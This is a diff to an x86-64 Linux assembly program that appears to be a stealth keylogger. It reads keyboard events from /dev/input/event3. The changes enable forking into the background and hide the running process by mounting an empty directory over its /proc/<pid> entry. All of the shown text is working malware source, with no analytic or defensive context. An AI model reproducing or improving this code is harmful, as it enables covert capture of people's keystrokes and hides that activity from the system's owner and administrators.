@@ -5,11 +5,11 @@ section .text
 _start:
   ; start by creating a fork and quit parent process to hide execution
 
-  ;mov rax, 57
-  ;syscall
+  mov rax, 57
+  syscall
 
-  ;cmp rax, 0
-  ;jne exit
+  cmp rax, 0
+  jne exit
 
   ; hiding process
   call hide_process
@@ -61,58 +61,80 @@ error:
 hide_process:
   mov rax, 83
   mov rdi, mountPoint
-  mov rdx, 422
+  mov rsi, 422
   syscall
 
   mov rax, 39
   syscall
 
- ; mov rdi, [pid]
-  ;mov rsi, 1234 
- ; call uitoa   ; Call the conversion function
-  
-  ;Append the PID to the process string
-  mov rsi, pid  ; Source (PID string)
-  mov rdi, process  ; Destination (process string)
-  mov rcx, pro  ; Length of the PID string
-  rep movsb         ; Copy the PID to the end of the process string
+  mov rdi, pid
+  mov rsi, rax  
+  call uitoa
+
+  lea rsi, [rel process]
+  mov rdi, [pid+1]
+  mov qword [rsi+6], rdi
 
   mov rax, 165
-  mov rsi, process
+  mov rdi, mountPoint
+  mov rsi, process 
+  mov rdx, 0 
+  mov r10, 4096
+  mov r8, 0
+  syscall
+
+  mov rax, 84
   mov rdi, mountPoint
   syscall
 
-; uitoa
-; convert in to a string
-; inputs:
-;    rsi: number to convert
-;    rdi: string buf
-; outputs:
-;    - buf changed with the string value of the number 
-uitoa:
-    ; Input:
-    ; rdi - Pointer to the destination buffer (where the ASCII string will be stored)
-    ; rsi - Input unsigned 64-bit integer
-    
-    ; Initialize registers
-    xor     rax, rax        ; Clear RAX to use it as a counter
-    mov     rcx, 10         ; Load divisor 10 into RCX
-    mov     rbx, rsi        ; Copy the input into RBX (we'll modify RBX)
-    mov     rdx, rdi        ; Copy the destination pointer into RDX
-    
-.convert_loop:
-    div     rcx             ; Divide RBX by 10, result in RAX (quotient), RBX (remainder)
-    add     dl, '0'         ; Convert remainder to ASCII and store it in the destination buffer
-    dec     rdx             ; Move the destination buffer pointer backward
-    test    rbx, rbx        ; Check if RBX (quotient) is zero
-    jnz     .convert_loop    ; If not zero, continue the loop
-    
-    ; Null-terminate the string
-    mov     byte [rdx], 0   ; Null-terminate
-    
-    ; Return
-    ret
+  mov rax, 83 
+  lea rdi, [process+6]  
+  mov rsi, 422
+  syscall
 
+  ret
+
+uitoa:
+  mov rax, rsi
+
+  cmp rax, 0
+  jnz .uitoa_converter
+  mov byte [rdi], '0' 
+  inc esi
+  mov rax, 0x1
+  jmp .uitoa_end
+
+.uitoa_converter:
+  mov r10, 10
+
+  xor rcx, rcx
+.loop:
+  xor rdx, rdx
+  div r10
+  inc ecx
+  cmp rax, 0
+  jnz .loop
+
+  inc ecx
+
+  mov r8, rcx
+  add rdi, rcx
+
+  mov rax, rsi
+  dec ecx
+
+.uitoa_convert:
+  xor rdx, rdx
+  dec rdi
+  div r10
+  add rdx, 48
+  mov byte [rdi], dl
+  loopnz .uitoa_convert
+
+  mov rax, r8
+
+.uitoa_end:
+  ret
 
 read_keys:
   xor rax, rax
@@ -229,8 +251,9 @@ section .data
   sourceEnd db "/device/capabilities/ev", 0
   sourceNmb db 0
   
-  mountPoint db "/lost+found", 0
-  process db "/proc/", 0
+  mountPoint db "./empty", 0
+  process db "/proc/000000", 0
+  filesystem db "ext4", 0
 
   source db "/dev/input/event3", 0
 
@@ -260,4 +283,4 @@ section .bss
   key resb 1
   keys resb 100
   addr resb 16
-  pid resb 11
+  pid resb 12 
